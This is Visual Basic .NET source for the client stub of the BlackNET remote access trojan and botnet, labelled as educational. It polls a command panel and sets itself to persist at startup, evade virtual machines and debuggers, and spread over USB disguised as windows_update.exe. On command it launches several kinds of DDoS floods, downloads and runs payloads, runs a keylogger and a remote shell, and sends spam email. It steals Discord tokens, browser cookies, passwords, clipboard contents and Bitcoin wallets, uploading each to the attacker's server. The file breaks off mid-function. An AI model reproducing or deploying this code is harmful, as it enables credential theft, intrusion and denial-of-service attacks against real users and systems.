Imports System.Threading
Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Security.Cryptography
Imports System.Management
Imports System.Reflection
Imports System.Security.Principal
Imports Microsoft.VisualBasic.Devices
Imports svchost.HTTPSocket
Imports svchost.Persistence
Imports svchost.Other
Imports svchost.DDOS
Imports svchost.Antis
Imports svchost.Spreads
Imports System.Net.Mail

' -------------------------------
'| BlackNET Stub
'|
'| Thx to: NYANxCAT, KFC, 0xfd
'|
'| Copyright (c) Black.Hackr - 2021
'|
'| This Project is for educational purposes only.
'| 
'| This Project is Licensed under MIT
' -------------------------------

Public Class MainController
    Public Host As String = "[HOST]"
    Public ID As String = "[ID]"
    Public Startup As Boolean = Boolean.Parse("[Startup]")
    Public HardInstall As Boolean = Boolean.Parse("[HardInstall]")
    Public StartName As String = "[StartupName]"
    Public BypassScanning As Boolean = Boolean.Parse("[BypassSCP]")
    Public USBSpread As Boolean = Boolean.Parse("[USBSpread]")
    Public AntiVM As Boolean = Boolean.Parse("[AntiVM]")
    Public ElevateUAC As Boolean = Boolean.Parse("[ElevateUAC]")
    Public AESKey As String = "[AESKey]"
    Public AESStatus As Boolean = Boolean.Parse("[EncStatus]")
    Public InstallName As String = "[Install_Name]"
    Public PathS As String = "[Install_Path]"
    Public ASchtask As Boolean = Boolean.Parse("[Added_SchTask]")
    Public DebugMode As Boolean = Boolean.Parse("[DebugMode]")
    Public WatcherStatus As Boolean = Boolean.Parse("[Watcher_Status]")
    Public WatcherBytes As String = "[Watcher_Bytes]"
    Public BinderStatus As Boolean = Boolean.Parse("[BinderStatus]")
    Public BinderBytes As String = "[BinderBytes]"
    Public DropperPath As String = "[DropperPath]"
    Public DropperName As String = "[DropperName]"
    Public DelayCodeStatus As Boolean = Boolean.Parse("[DelayBool]")
    Public DelayCodeTime As Integer = Integer.Parse("[SleepTime]")
    Public Ver As String = "v3.6.0 Public"
    Public st As Integer = 0
    Public Y As String = "[Splitter]"
    Public trd As Thread
    Public LO As Object = New FileInfo(Application.ExecutablePath)
    Public MTX As String = "[MUTEX]"
    Public MT As Mutex = Nothing
    Public s As String = New FileInfo(Application.ExecutablePath).Name
    Public TempPath As String = Path.GetTempPath
    Public LogsPath As String = Path.Combine(TempPath, s & ".txt")
    Public C As HTTP = New HTTP
    Dim Watchdog As New Watchdog
    Dim tt As Thread = New Thread(AddressOf LimeLogger.Start, 1)
    Dim Is_Blacklisted As Boolean = My.Settings.blacklist
    Private Sub MainController_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try

            If (DelayCodeStatus = True) Then
                System.Threading.Thread.Sleep(DelayCodeTime)
            End If

            If (My.Settings.update = True) Then
                If Not Application.ExecutablePath = Path.Combine(TempPath, My.Settings.newFName) Then
                    If File.Exists(Path.Combine(TempPath, My.Settings.newFName)) Then
                        Process.Start(Path.Combine(TempPath, My.Settings.newFName))

                        Application.Exit()
                    End If
                End If
            End If

            Debug()

            checkMUTEX()

            If ElevateUAC = True Then
                Try
                    Dim ElevateThread As New Thread(AddressOf RestartElevated)
                    ElevateThread.IsBackground = True
                    ElevateThread.Start()
                Catch ex As Exception
                    Debug(ex.Message)
                    Return
                End Try
            End If

            If Application.ExecutablePath.EndsWith("windows_update.exe") Then
                IO.File.WriteAllText(Path.Combine(TempPath, "BlackNET.dat"), "True")
            End If

            If My.Settings.moveStatus = True Then
                C.Host = My.Settings.newHost
            Else
                If AESStatus = True Then
                    C.Host = AES_Decrypt(Host, AESKey)
                Else
                    C.Host = Host
                End If
            End If

            C.ID = ID & "_" & HWD()
            C.Data = ClientData()

            If DebugMode = True Then
                C.DebugMode = True
            End If

            If My.Computer.Network.IsAvailable = True Then
                If C.IsPanel(C.Host) Then
                    If Is_Blacklisted = False Then
                        C.Connect()

                        C.Send("Online")

                        C.Log("Succ", "Client is Connected")
                    Else
                        Uninstall(True, False)
                    End If
                Else
                    Uninstall(True, False)
                End If
            Else
                Uninstall(True, False)
            End If

            If BinderStatus = True Then
                Dim Binder As New BinderService
                If Not File.Exists(Environ(DropperPath) & DropperName) Then
                    With Binder
                        .BinderBytes = BinderBytes
                        .DropperName = DropperName
                        .DropperPath = DropperPath
                        .StartBinder()
                    End With
                End If
            End If

            If Startup = True Then
                trd = New Thread(AddressOf StartWork)
                trd.IsBackground = True
                trd.Start(True)
            End If

            If BypassScanning = True Then
                Dim bypass As New Anti_Debugging
                If (bypass.Start() = False) Then
                    C.Log("Fail", "Client might be a malware scanner ):")
                End If
            End If

            If AntiVM = True Then
                Dim AntiVirtual As New AntiVM
                AntiVirtual.ST(Application.ExecutablePath)
            End If

            If USBSpread = True Then
                Dim USB As New USBSpread
                USB.ExeName = "windows_update.exe"
                USB.Start()
            End If

            If HardInstall = True Then
                Dim StealthMode As New Stealth_Mode(Path.Combine(Environ(PathS), Path.Combine("Microsoft", "MyClient")), InstallName, StartName)
                StealthMode.Install_Server()

                If Application.ExecutablePath = Path.Combine(Path.Combine(Environ(PathS), Path.Combine("Microsoft", "MyClient")), InstallName) Then
                    C.Send("Online")
                Else
                    Process.Start(Path.Combine(Path.Combine(Environ(PathS), Path.Combine("Microsoft", "MyClient")), InstallName))
                    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden + FileAttributes.System)
                    Application.Exit()
                End If
            End If

            If ASchtask = True Then
                Dim SchTask As New SchTask
                SchTask.PATHS = PathS
                SchTask.InstallName = InstallName
                SchTask.HardInstall = HardInstall
                SchTask.AddtoSchTask()
            End If

            If WatcherStatus = True Then
                Watchdog.NewWatchdog(WatcherBytes)
            End If

            Dim t As New Thread(AddressOf IND)
            t.IsBackground = True
            t.Start(True)

            CheckForIllegalCrossThreadCalls = False

        Catch ex As Exception
            Debug(ex.Message)
        End Try
    End Sub
    Function checkMUTEX()
        Try
            For Each x In Process.GetProcesses
                Try
                    If CompDir(New FileInfo(x.MainModule.FileName), LO) Then
                        If x.Id > Process.GetCurrentProcess.Id Then
                            End
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
        Catch ex As Exception
        End Try
        Try
            Mutex.OpenExisting(MTX)
            End
        Catch ex As Exception
        End Try
        Try
            MT = New Mutex(True, MTX)
            Return True
        Catch ex As Exception
            Return False
            End
        End Try
    End Function
    Public Function ClientData()
        Dim x As String = Nothing
        x += HWD() & Y
        x += My.Computer.Name & Y
        x += My.Computer.Info.OSFullName & Y
        x += GetAntiVirus() & Y
        x += Ver & Y
        x += "Online" & Y
        x += checkUSB() & Y
        x += checkadmin()
        Return x
    End Function
    Public Function checkBlacklist() As Boolean
        Return My.Settings.blacklist
    End Function
    Public Sub IND(ByVal x As Boolean)
        ' Command Controller With Queue System (:
        Try
            Dim CommandsQueue As New Queue(Of String)

            Do While x = True
x:

                Try
                    Dim Command As String = C._GET("getCommand.php?id=" & C.ENB(ID & "_" & HWD()))

                    If (Command = C.ENB("Ping")) Then ' Check if there is a command
                        C.Send("Pinged")
                        GoTo x
                    End If

                    If Not CommandsQueue.Contains(Command) Then
                        CommandsQueue.Enqueue(Command)
                    End If

                    If (CommandsQueue.Count > 0) Then
                        While CommandsQueue.Count > 0
                            CommandController(CommandsQueue.Dequeue())
                        End While
                    End If
                Catch ex As Exception
                    Debug(ex.Message)
                    C.Log("Fail", "An unexpected error occurred " & ex.Message)
                End Try
            Loop
        Catch ex As Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
        End Try
    End Sub
    Private Sub CommandController(ByVal Command As String)
        Try
            Dim A As String() = Split(C.DEB(Command), Y)
            Select Case A(0)
                Case "Ping"
                    C.Send("Ping")

                Case "StartDDOS"
                    Select Case A(1)
                        Case "UDPAttack"
                            Try
                                UDP.HostToAttack = A(2)
                                UDP.Threadsto = Integer.Parse(A(3))
                                UDP.Time = Integer.Parse((4))
                                UDP.DOSData = Randomisi(300)

                                Dim UDPThread As New Thread(AddressOf UDP.StartUDP)
                                UDPThread.IsBackground = True
                                UDPThread.Start()

                                C.Send("CleanCommands")
                                C.Log("Succ", "UDP Attack Started")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " + ex.Message)
                            End Try


                        Case "SlowlorisAttack"
                            Try
                                Slowloris.HostToAttack = A(2)
                                Slowloris.ThreadstoUse = Integer.Parse(A(3))
                                Slowloris.TimetoAttack = Integer.Parse(A(4))
                                Slowloris.PostDATA = Randomisi(300)

                                Dim SlowlorisThread As New Thread(AddressOf Slowloris.StartSlowloris)
                                SlowlorisThread.IsBackground = True
                                SlowlorisThread.Start()

                                C.Send("CleanCommands")
                                C.Log("Succ", "Slowloris Attack Started")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try


                        Case "ARMEAttack"
                            Try
                                ARME.HostToAttack = A(2)
                                ARME.ThreadstoUse = Integer.Parse(A(3))
                                ARME.TimetoAttack = Integer.Parse(A(4))
                                ARME.PostDATA = Randomisi(300)

                                Dim ARMEThread As New Thread(AddressOf ARME.StartARME)
                                ARMEThread.IsBackground = True
                                ARMEThread.Start()

                                C.Send("CleanCommands")
                                C.Log("Succ", "ARME Attack Started")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try


                        Case "TCPAttack"
                            Try
                                Condis.HostToAttack = A(2)
                                Condis.ThreadstoUse = Integer.Parse(A(3))
                                Condis.TimetoAttack = Integer.Parse(A(4))
                                Condis.Port = Integer.Parse(A(5))

                                Dim CondisThread As New Thread(AddressOf Condis.StartCondis)
                                CondisThread.IsBackground = True
                                CondisThread.Start()

                                C.Send("CleanCommands")
                                C.Log("Succ", "TCP Attack Started")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try


                        Case "HTTPGetAttack"
                            Try
                                HTTPGet.HostToAttack = A(2)
                                HTTPGet.ThreadstoUse = Integer.Parse(A(3))
                                HTTPGet.TimetoAttack = Integer.Parse(A(4))

                                Dim HTTPGetThread As New Thread(AddressOf HTTPGet.StartHTTPGet)
                                HTTPGetThread.IsBackground = True
                                HTTPGetThread.Start()

                                C.Send("CleanCommands")
                                C.Log("Succ", "HTTP (GET) Attack Started")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try


                        Case "BWFloodAttack"
                            Try
                                BandwidthFlood.HostToAttack = A(2)
                                BandwidthFlood.ThreadstoUse = Integer.Parse(A(3))
                                BandwidthFlood.TimetoAttack = Integer.Parse(A(4))

                                Dim BandwidthFloodThread As New Thread(AddressOf BandwidthFlood.StartBandwidthFlood)
                                BandwidthFloodThread.IsBackground = True
                                BandwidthFloodThread.Start()

                                C.Send("CleanCommands")
                                C.Log("Succ", "Bandwidth Flood Attack Started")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try


                        Case "PostHTTPAttack"
                            Try
                                PostHTTP.HostToAttack = A(2)
                                PostHTTP.ThreadstoUse = Integer.Parse(A(3))
                                PostHTTP.TimetoAttack = Integer.Parse(A(4))
                                PostHTTP.PostDATA = Randomisi(300)

                                Dim PostHTTPThread As New Thread(AddressOf PostHTTP.StartPOSTHTTP)
                                PostHTTPThread.IsBackground = True
                                PostHTTPThread.Start()

                                C.Send("CleanCommands")
                                C.Log("Succ", "HTTP (POST) Attack Started")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try
                    End Select

                Case "StopDOOS"
                    Select Case A(1)
                        Case "UDPAttack"
                            Try
                                UDP.StopUDP()
                                C.Send("CleanCommands")
                                C.Log("Succ", "UDP Attack Stopped")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try


                        Case "SlowlorisAttack"
                            Try
                                Slowloris.StopSlowloris()
                                C.Send("CleanCommands")
                                C.Log("Succ", "Slowloris Attack Stopped")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try

                        Case "ARMEAttack"
                            Try
                                ARME.StopARME()
                                C.Send("CleanCommands")
                                C.Log("Succ", "ARME Attack Stopped")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try

                        Case "TCPAttack"
                            Try
                                Condis.StopCondis()
                                C.Send("CleanCommands")
                                C.Log("Succ", "TCP Attack Stopped")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try


                        Case "HTTPGetAttack"
                            Try
                                HTTPGet.StopHTTPGET()
                                C.Send("CleanCommands")
                                C.Log("Succ", "HTTP (GET) Attack Stopped")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try


                        Case "BWFloodAttack"
                            Try
                                BandwidthFlood.StopBandwidthFlood()
                                C.Send("CleanCommands")
                                C.Log("Succ", "Bandwidth Flood Attack Stopped")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try



                        Case "PostHTTPAttack"
                            Try
                                PostHTTP.StopPOSTHTTP()
                                C.Send("CleanCommands")
                                C.Log("Succ", "HTTP (POST) Attack Stopped")
                            Catch ex As Exception
                                C.Send("CleanCommands")
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                            End Try
                    End Select


                Case "UploadFile"
                    Try
                        C.DownloadFile(A(1), Path.Combine(Environ("Temp"), A(2)))
                        Process.Start(Path.Combine(Environ("Temp"), A(2)))
                        C.Send("CleanCommands")
                        C.Log("Succ", "File has been uploaded and executed")
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try


                Case "OpenPage"
                    Try
                        Dim OpenPage As New Thread(AddressOf BrowserHandler.OpenWebPage)
                        OpenPage.IsBackground = True
                        OpenPage.Start(A(1))
                        C.Log("Succ", "Webpage has been opened in visable mode")
                    Catch ex As Exception
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred" & ex.Message)
                    End Try
                    C.Send("CleanCommands")


                Case "OpenHidden"
                    Dim WebThread As New Thread(AddressOf OpenWebHidden)
                    WebThread.IsBackground = True
                    WebThread.Start(A(1))
                    C.Send("CleanCommands")


                Case "Uninstall"
                    Try
                        C.Log("Succ", "Client has been removed")

                        Uninstall(True, False)
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try


                Case "ExecuteScript"
                    Try
                        C.DownloadFile(C.Host & "/scripts/" & A(2), Path.Combine(TempPath, A(2)))
                        Select Case A(1)
                            Case "bat"
                                Process.Start(Path.Combine(TempPath, A(2)))
                            Case "vbs"
                                Process.Start(Path.Combine(TempPath, A(2)))
                            Case "ps1"
                                PowerShell(Path.Combine(TempPath, A(2)))
                        End Select
                        C.Send("DeleteScript" & Y & A(2))
                        C.Send("CleanCommands")
                        C.Log("Succ", "Script Has heen executed")
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "StealDiscord"
                    Try
                        If Directory.Exists(Path.Combine(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord"), "Local Storage"), "leveldb")) Then
                            Dim DiscordStealer As New DiscordToken
                            If (DiscordStealer.GetToken() = True) Then
                                C.Upload(Path.Combine(Path.GetTempPath, "Token.txt"))
                                C.Send("CleanCommands")
                                C.Log("Succ", "Discord Token has been uploaded")
                            Else
                                C.Send("CleanCommands")
                                C.Log("Fail", "Client does not have Discord")
                            End If
                        Else
                            C.Send("CleanCommands")
                            C.Log("Fail", "Client does not have Discord")
                        End If
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "Close"
                    Try
                        C.Send("CleanCommands")
                        C.Log("Succ", "Connection closed")
                        C.Send("Offline")
                        If WatcherStatus = True Then
                            Watchdog.KeepRunning = False
                            Watchdog.StopWatcher(False)
                        End If
                        Application.Exit()
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "ShowMessageBox"
                    Try
                        Dim msgIcon As MessageBoxIcon
                        Dim msgButton As MessageBoxButtons

                        Select Case A(3)
                            Case "None"
                                msgIcon = MessageBoxIcon.None
                            Case "Information"
                                msgIcon = MessageBoxIcon.Information
                            Case "Asterisk"
                                msgIcon = MessageBoxIcon.Asterisk
                            Case "Critical"
                                msgIcon = MessageBoxIcon.Error
                            Case "Warning"
                                msgIcon = MessageBoxIcon.Warning
                            Case "Question"
                                msgIcon = MessageBoxIcon.Question
                        End Select

                        Select Case A(4)
                            Case "OkOnly"
                                msgButton = MessageBoxButtons.OK
                            Case "OkCancel"
                                msgButton = MessageBoxButtons.OKCancel
                            Case "YesNo"
                                msgButton = MessageBoxButtons.YesNo
                            Case "YesNoCancel"
                                msgButton = MessageBoxButtons.YesNoCancel
                            Case "AbortRetryIgnore"
                                msgButton = MessageBoxButtons.AbortRetryIgnore
                            Case "RetryCancel"
                                msgButton = MessageBoxButtons.RetryCancel
                        End Select

                        MessageBox.Show(A(1), A(2), msgButton, msgIcon)
                        C.Send("CleanCommands")
                        C.Log("Succ", "Messagebox has poped up")
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "MoveClient"
                    Try
                        My.Settings.moveStatus = True
                        My.Settings.newHost = A(1)
                        My.Settings.Save()
                        C.Log("Succ", "Client has been moved to the new host")
                        Uninstall(False, True)
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try


                Case "Blacklist"
                    Try
                        My.Settings.blacklist = True
                        My.Settings.Save()

                        C.Log("Succ", "Client has been blacklisted")
                        Uninstall(True, False)
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try


                Case "Screenshot"
                    Try
                        Dim Screenshot As New RemoteDesktop
                        Screenshot.C = C
                        Screenshot.ID = C.ENB(ID + "_" + HWD())
                        Screenshot.Start()
                        C.Send("CleanCommands")
                        C.Log("Succ", "Screenshot has been uploaded")
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try


                Case "StealCookie"
                    StealFFCookies()
                    C.Send("CleanCommands")


                Case "StealChCookies"
                    StealChromeCookies()
                    C.Send("CleanCommands")


                Case "InstalledSoftwares"
                    Try
                        ProgramList()
                        C.Upload(Path.Combine(TempPath, "ProgramList.txt"))
                        C.Log("Succ", "User installed program list has been uploaded")
                        C.Send("CleanCommands")
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "GetClipboard"
                    Try
                        Dim Clipboard As New ClipboardAsync

                        If Clipboard.ContainsText() Then
                            C._POST("post.php", "folder_name=upload/" & C.ID & "&file_name=clipboard.txt&data=" & Clipboard.GetText())
                            C.Log("Succ", "Clipboard Data has been uploaded")
                            C.Send("CleanCommands")
                        Else
                            C.Log("Fail", "Client Clipboard is empty")
                            C.Send("CleanCommands")
                        End If
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "GetFile"
                    Try
                        If (A(1).Contains("%")) Then
                            Dim FileSearcherThread As New Thread(AddressOf FileSearcher)
                            FileSearcherThread.IsBackground = True
                            FileSearcherThread.Start({A(1)})

                            C.Send("CleanCommands")

                        Else

                            Try
                                C.Upload(A(1))

                                C.Log("Succ", "File has been uploaded")

                                C.Send("CleanCommands")
                            Catch ex As Exception
                                Debug(ex.Message)
                                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                                C.Send("CleanCommands")
                            End Try

                        End If
                    Catch ex As Exception
                        Debug(ex.Message)

                        C.Log("Fail", "An unexpected error occurred " & ex.Message)

                        C.Send("CleanCommands")
                    End Try

                Case "StealBitcoin"
                    Try
                        If (File.Exists(Path.Combine(Environ("appdata"), Path.Combine("Bitcoin", "wallet.dat")))) Then
                            C.Upload(Path.Combine(Environ("appdata"), Path.Combine("Bitcoin", "wallet.dat")))
                            C.Send("CleanCommands")
                            C.Log("Succ", "Bitcoin Wallet has been uploaded")
                        Else
                            C.Send("CleanCommands")
                            C.Log("Fail", "System did not find a .dat wallet")
                        End If
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "StartKeylogger"
                    tt.IsBackground = True
                    tt.Start()
                    C.Log("Succ", "KeyLogger has been started")
                    C.Send("CleanCommands")

                Case "StopKeylogger"
                    tt.Abort()
                    C.Log("Succ", "Keylogger has been aborted")
                    C.Send("CleanCommands")

                Case "RetriveLogs"
                    C.Upload(LogsPath)
                    C.Log("Succ", "KeyLogs file has been uploaded")
                    C.Send("CleanCommands")


                Case "StealPassword"
                    Try
                        Dim StealerThread As New Thread(AddressOf StealPasswords)
                        StealerThread.IsBackground = True
                        StealerThread.Start()
                        C.Send("CleanCommands")
                    Catch ex As Exception
                        Debug(ex.Message)
                        C.Send("CleanCommands")
                    End Try

                Case "InvokeCustom"
                    Try
                        Dim PluginBytes As Byte() = C.DownloadData(C.Host & "/plugins/" & A(1))
                        If Not A(5) = "txt" Then
                            CustomPlugin(PluginBytes, A(2), A(3), A(4), A(5))
                        Else
                            CustomPlugin(PluginBytes, A(2), A(3), A(4))
                        End If
                        C.Log("Succ", "Custom Plugin has been executed")
                        C.Send("CleanCommands")
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "SpamEmail"
                    Try
                        Dim Smtp_Server As New SmtpClient
                        Dim e_mail As New MailMessage()
                        Smtp_Server.UseDefaultCredentials = False
                        Smtp_Server.Credentials = New Net.NetworkCredential(A(3), C.DEB(A(4)))
                        Smtp_Server.Port = Convert.ToInt32(A(2))
                        Smtp_Server.EnableSsl = True
                        Smtp_Server.Host = A(1)

                        e_mail = New MailMessage()
                        e_mail.From = New MailAddress(A(3))
                        If A(5).Contains(",") Then
                            For Each email As String In A(5).Split(",")
                                e_mail.To.Add(email)
                            Next
                        Else
                            e_mail.To.Add(A(5))
                        End If
                        e_mail.Subject = A(6)
                        e_mail.IsBodyHtml = True
                        e_mail.Body = A(7)
                        Smtp_Server.Send(e_mail)

                        C.Log("Succ", "Message Has Been Sent")
                        C.Send("CleanCommands")
                    Catch ex As Exception
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                        C.Send("CleanCommands")
                    End Try

                Case "RemoteShell"

                    Dim shellcommand As String = Unsanitize(A(2))

                    Dim paramters As String() = {A(1), shellcommand}
                    Dim shellthread As New Thread(AddressOf RemoteShell)
                    shellthread.IsBackground = True
                    shellthread.Start(paramters)
                    C.Send("CleanCommands")

                Case "StealHistory"
                    Dim StealHistoryThread As New Thread(AddressOf StealHistory)
                    StealHistoryThread.IsBackground = True
                    StealHistoryThread.Start()
                    C.Send("CleanCommands")

                Case "CleanTemp"
                    Dim filelist() As String = {"ProgramList.txt", C.ENB(ID & "_" & HWD()) & ".png", "CookiesCh.sqlite", "cookies.sqlite", "Passwords.txt", "Token.txt", "History.txt", s & ".txt"}
                    TempCleaner(filelist)

                    C.Send("CleanCommands")

                Case "UpdateClient"
                    UpdateClient(A(1), A(2))
                    C.Send("CleanCommands")

                Case "Restart"
                    C.Send("CleanCommands")
                    C.Log("Succ", "Client Has Been Restarted")
                    If WatcherStatus = True Then
                        Watchdog.KeepRunning = False
                        Watchdog.StopWatcher(False)
                    End If
                    Application.Restart()

                Case "Elevate"
                    Try
                        Dim ElevateThread As New Thread(AddressOf RestartElevated)
                        ElevateThread.IsBackground = True
                        ElevateThread.Start()
                    Catch ex As Exception
                        Debug(ex.Message)
                    End Try
                    C.Send("CleanCommands")

                Case "Logoff"

                    Try
                        C.Log("Succ", "Client Computer has been logged Off")
                        C.Send("CleanCommands")
                        Shell("shutdown -l -t 00", AppWinStyle.Hide)
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "Restart"
                    Try
                        C.Log("Succ", "Client Computer has been restarted")
                        C.Send("CleanCommands")
                        Shell("shutdown -r -t 00", AppWinStyle.Hide)
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try

                Case "Shutdown"
                    Try
                        C.Log("Succ", "Client Computer has been shutdown")
                        C.Send("CleanCommands")
                        Shell("shutdown -s -t 00", AppWinStyle.Hide)
                    Catch ex As Exception
                        C.Send("CleanCommands")
                        Debug(ex.Message)
                        C.Log("Fail", "An unexpected error occurred " & ex.Message)
                    End Try
            End Select
        Catch ex As Exception
            Debug(ex.Message)
        End Try
    End Sub

    Public Function Unsanitize(ByVal value As String)

        Dim shellcommand As String = value.Replace("&amp;", "&").Replace("&lt;", "<").Replace("&gt;", ">").Replace("&quot;", """").Replace("&apos;", "'")

        Return shellcommand

    End Function

    Public Function Debug(Optional ByVal data As String = "init")
        If DebugMode = True Then
            If (data = "init") Then
                If Not File.Exists("logs.txt") Then
                    File.Create("logs.txt")
                End If
            Else
                If File.Exists("logs.txt") Then
                    File.AppendAllText("logs.txt", "[" & DateTime.Now & "]" & ": " & data & Environment.NewLine)
                End If
            End If
            Return True
        Else
            Return False
        End If
    End Function

    Public Function StealChromeCookies()
        Try
            Dim chromeData As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Path.Combine(Path.Combine(Path.Combine("Google", "Chrome"), "User Data"), "Default"))

            If File.Exists(Path.Combine(chromeData, "Cookies")) Then
                File.Copy(Path.Combine(chromeData, "Cookies"), Path.Combine(TempPath, "CookiesCh.sqlite"), True)
                C.Upload(Path.Combine(TempPath, "CookiesCh.sqlite"))
                C.Log("Succ", "Chrome cookies has been uploaded")
            Else
                C.Log("Fail", "Client does not have cookies")
            End If
            Return True
        Catch ex As Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
            Return False
        End Try
    End Function
    Public Function UpdateClient(ByVal URL As String, ByVal FileName As String)
        Try
            C.DownloadFile(URL, Path.Combine(TempPath, FileName))

            File.SetAttributes(Path.Combine(TempPath, FileName), FileAttributes.Hidden + FileAttributes.System)

            C.Send("Uninstall")

            C.Log("Succ", "Client has been updated")

            AStartup(getMD5Hash(File.ReadAllBytes(Path.Combine(TempPath, FileName))), Path.Combine(TempPath, FileName))

            My.Settings.update = True
            My.Settings.newFName = FileName

            Process.Start(Path.Combine(TempPath, FileName))

            Uninstall(True, False)
            Return True
        Catch ex As Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
            Return False
        End Try
    End Function
    Public Function RemoteShell(ByVal paramaters As String())
        Try
            Dim oProcess As New Process()
            Dim oStartInfo As New ProcessStartInfo(paramaters(0), "/c " & paramaters(1))
            oStartInfo.UseShellExecute = False
            oStartInfo.CreateNoWindow = True
            oStartInfo.RedirectStandardOutput = True
            oProcess.StartInfo = oStartInfo
            oProcess.Start()

            Dim sOutput As String
            Using oStreamReader As System.IO.StreamReader = oProcess.StandardOutput
                sOutput = oStreamReader.ReadToEnd()
            End Using

            C._POST("remoteshell.php", "clientid=" & C.ID & "&result=" & sOutput)

            C.Log("Succ", "Shell Command has been executed")

            C.Send("CleanCommands")
            Return True
        Catch ex As Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
            Return False
        End Try
    End Function

    Public Function FileSearcher(ByVal paramters() As Object)
        Try

            Try
                If Not (File.Exists(Path.Combine(Application.StartupPath, "Ionic.Zip.dll"))) Then
                    C.DownloadFile(C.Host & "/plugins/Ionic.Zip.dll", Path.Combine(Application.StartupPath, "Ionic.Zip.dll"))
                    File.SetAttributes(Path.Combine(Application.StartupPath, "Ionic.Zip.dll"), FileAttributes.Hidden)
                End If

                Dim PluginData As Byte() = C.DownloadData(C.Host & "/plugins/FileSearcher.dll")

                If (LoadDLL(PluginData, C.DEB("RmlsZVNlYXJjaGVyLkZpbGVTZWFyY2hlcg"), C.DEB("UnVu"), True, paramters) = True) Then

                    Dim files() As String = Directory.GetFiles(Path.GetTempPath)

                    For Each zipfile As String In files
                        If Path.GetFileNameWithoutExtension(zipfile) = "Stolen_Files" Then
                            If (C.Upload(Path.Combine(TempPath, zipfile))) Then
                                File.Delete(Path.Combine(TempPath, zipfile))
                            End If
                        End If
